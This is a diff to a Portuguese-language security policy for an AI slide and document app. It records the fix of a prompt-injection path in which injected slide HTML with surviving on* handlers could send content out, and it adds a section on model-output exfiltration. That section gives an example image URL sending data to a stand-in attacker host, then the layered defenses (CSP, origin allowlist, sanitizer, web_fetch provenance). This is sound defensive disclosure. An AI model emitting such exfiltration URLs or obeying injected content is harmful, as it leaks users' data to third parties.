@@ -1,4 +1,4 @@
-<!-- i18n: source=SECURITY.md source-hash=a75d81c20ffb71062113d1ae589088cacf24b495 status=current -->
+<!-- i18n: source=SECURITY.md source-hash=866940c132f0fbe2b704d4d460350dd6a596b811 status=current -->
 # Política de Segurança
 
 [English](../../SECURITY.md) · **Português (Brasil)** · [Español](../es/SECURITY.md)
@@ -237,7 +237,7 @@ parser. É JS puro e roda no servidor sem DOM. DOMPurify precisaria de um DOM no
 | Onde | Sandbox | Avaliação |
 |---|---|---|
 | `DeckTemplateInspector.tsx:120,131` e a miniatura sem `previewCardHtml` (`DeckTemplatesSettings.tsx`) | `allow-scripts` | Aceitável. Os scripts do DS rodam com origem opaca (sem cookie, sem `/api` do app, sem navegar o topo nem abrir pop-ups). Eles ainda podem fazer requisições de rede para fora, mas o que está no frame é só o próprio DS. |
-| `deck/HtmlSlideFrame.tsx:138`, `deck/HtmlSlideEditor.tsx:838` | `allow-scripts` | **Follow-up.** O HTML dos slides vem do modelo, e o servidor (`sanitizeHtmlDeck`, `server/blocks.ts:75`) só remove `<script>…</script>` por regex: atributos `on*` sobrevivem e rodam nesses frames. A origem é opaca (sem acesso à API), mas um slide gerado por injeção de prompt pode mandar o conteúdo do slide para fora e, no editor, enviar uma mensagem `html` que o pai aceita (`e.source` confere) e grava no próprio deck. Correção proposta: sanitizar o HTML do deck no servidor com a mesma biblioteca (o runtime do editor é injetado pelo cliente, então o conteúdo pode ficar sem handlers) e uma CSP com `connect-src`. |
+| `deck/HtmlSlideFrame.tsx`, `deck/HtmlSlideEditor.tsx` | `allow-scripts` | Aceitável com as camadas abaixo. O HTML do slide vem do modelo. O servidor (`sanitizeHtmlDeck`, `server/blocks.ts`) o sanitiza com o sanitizador por lista de permissões a cada gravação e a cada leitura (manipuladores, URLs `javascript:`, `<base>`, `<meta http-equiv>`, `<link>`, frames e formulários, `src`, `srcset`, `url()` e `@import` remotos), e a CSP aplicada bloqueia carregamentos remotos, scripts remotos e `connect-src`. A origem é opaca (sem acesso à API). Segue aberto: WebRTC a partir de script inline (veja o parágrafo da CSP acima). |
 | `lib/domToSlideOps.ts:476`, `allow-same-origin`, sem scripts | `allow-same-origin` | Aceitável. Frame oculto para medir o layout na exportação. Os scripts e handlers não rodam, e nenhum nó do frame é movido para o documento principal. Não acrescente `allow-scripts` aqui: com `allow-same-origin` isso dá acesso total ao app. |
 | `HtmlDeckPreview.tsx:53`, `allow-same-origin`, sem scripts | `allow-same-origin` | Aceitável, mesma regra. O componente não é importado em lugar nenhum (código morto, candidato a remoção). |
 
@@ -253,6 +253,24 @@ Quando o app busca uma URL escolhida pelo modelo (ferramenta de página web), a 
 só segue para endereços públicos: loopback, redes privadas, CGNAT, link-local (incluindo o
 endpoint de metadados de nuvem), ULA e reservados ficam bloqueados, em cada salto de
 redirecionamento. A mesma regra está em `server/a2aGuard.ts`, que será usado pelo A2A.
+
+## Dados saindo pela saída do modelo (2.0.0)
+
+O texto que o modelo escreve pode ser induzido pelo que ele lê (um documento, uma página web, um resultado de MCP ou do Genie). Uma URL nesse texto pode carregar dados: `![x](https://atacante.example/p.png?d=<dados>)` faz o navegador chamar o host sem nenhum clique, e o mesmo vale para uma fonte, folha de estilo ou script remoto em um documento, slide ou cartão de design system. **Versões anteriores à 2.0.0 estão expostas a isso. Atualize para a 2.0.0.**
+
+A 2.0.0 fecha isso em camadas:
+
+- **CSP aplicada** (`server/securityHeaders.ts`): imagens, fontes, estilos, mídia, conexões e frames só carregam do app, `data:` e `blob:`; `script-src 'self' 'unsafe-inline'` bloqueia scripts remotos. Um único cabeçalho cobre todo frame `srcdoc` (documentos, slides, exportação, impressão), streaming e mensagens antigas.
+- **Lista de origens.** Um admin adiciona origens em Configurações > Administradores > *Origens externas de recursos* (gravadas em `app_settings.external_asset_origins`, valem em cerca de 15 s, auditadas como `egress.settings`); `EXTERNAL_ASSET_ORIGINS` no `app.yaml` é um piso. As entradas são `https://host[:porta]`, sem curinga, caminho nem IP, nunca o app, o workspace ou hosts da Databricks. Abrem só `img-src`, `font-src` e `style-src`; nunca `connect-src`, `media-src`, `frame-src`, `default-src` nem `script-src`.
+- **Marcador** para imagem externa em resposta do chat ou documento (host visível, sem "carregar mesmo assim").
+- **Sanitizador de decks** ao salvar e ao ler, cópias de conversas incluídas; o importador de design system avisa sobre as referências externas que remove.
+- **Procedência do `web_fetch`**: só uma URL que o usuário digitou ou que um resultado de `web_search`/`web_fetch` listou. Outros resultados de ferramenta não são fonte.
+- **Rotas de bytes de artefatos** (imagens, exportações): CSP de sandbox, `nosniff`, `attachment`.
+- **Logs**: `egress_blocked` e `csp_violation`, só host ou diretiva. Veja [docs/operations.md](operations.md#617-csp-de-saída-200-permitir-uma-origem-interruptor-de-emergência-ler-os-logs).
+
+`CSP_EGRESS=report` (exatamente esse valor, no `app.yaml`, mesmo build) reverte só a parte do navegador para report-only. O marcador, o sanitizador, a regra do `web_fetch` e a regra do prompt seguem ligados.
+
+**O que isto não cobre.** Argumentos de ferramentas não são um caminho do navegador: mantenha restritiva a política de rede serverless (sem rede de saída para a ferramenta Python), revise quais ferramentas MCP externas podem escrever ou publicar e desative as desnecessárias, e lembre que a consulta da busca web vai ao provedor que o admin escolheu. O WebRTC a partir de script inline em frames isolados segue aberto até que esses frames tenham origem e política próprias (a navegação do frame é bloqueada por `frame-src`).
 
 ## Imagens geradas (UC Volume)
 
